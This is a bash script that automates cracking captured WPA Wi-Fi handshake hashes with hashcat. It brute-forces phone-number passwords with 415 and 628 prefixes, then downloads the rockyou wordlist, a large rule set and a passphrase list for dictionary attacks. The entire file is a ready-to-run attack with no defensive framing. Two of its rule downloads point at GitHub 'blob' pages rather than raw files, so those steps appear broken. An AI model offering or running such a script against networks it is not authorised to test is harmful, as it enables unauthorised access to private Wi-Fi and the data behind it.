#!/bin/bash
echo "############################################################"
echo "##             Trying the Phone Number Attack             ##"
echo "############################################################"
hashcat -m 22000 $1 -w 3 -a3 -1 "?d" "415?1?1?1?1?1?1?1"
hashcat -m 22000 $1 -w 3 -a3 -1 "?d" "628?1?1?1?1?1?1?1"


echo "############################################################"
echo "##              Trying the Rockyou Wordlist               ##"
echo "############################################################"
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
## wget https://raw.githubusercontent.com/hashcat/hashcat/master/rules/dive.rule
wget https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
hashcat -a 0 -m 22000 $1 -w 3 -r OneRuleToRuleThemAll.rule rockyou.txt


echo "############################################################"
echo "##               Trying Passphrase attack                 ##"
echo "############################################################"
wget https://f002.backblazeb2.com/file/passphrase-wordlist/passphrases.txt
wget https://github.com/initstring/passphrase-wordlist/blob/master/hashcat-rules/passphrase-rule1.rule
wget https://github.com/initstring/passphrase-wordlist/blob/master/hashcat-rules/passphrase-rule2.rule
hashcat -a 0 -m 22000 $1 passphrases.txt -r passphrase-rule1.rule -r passphrase-rule2.rule -w 3
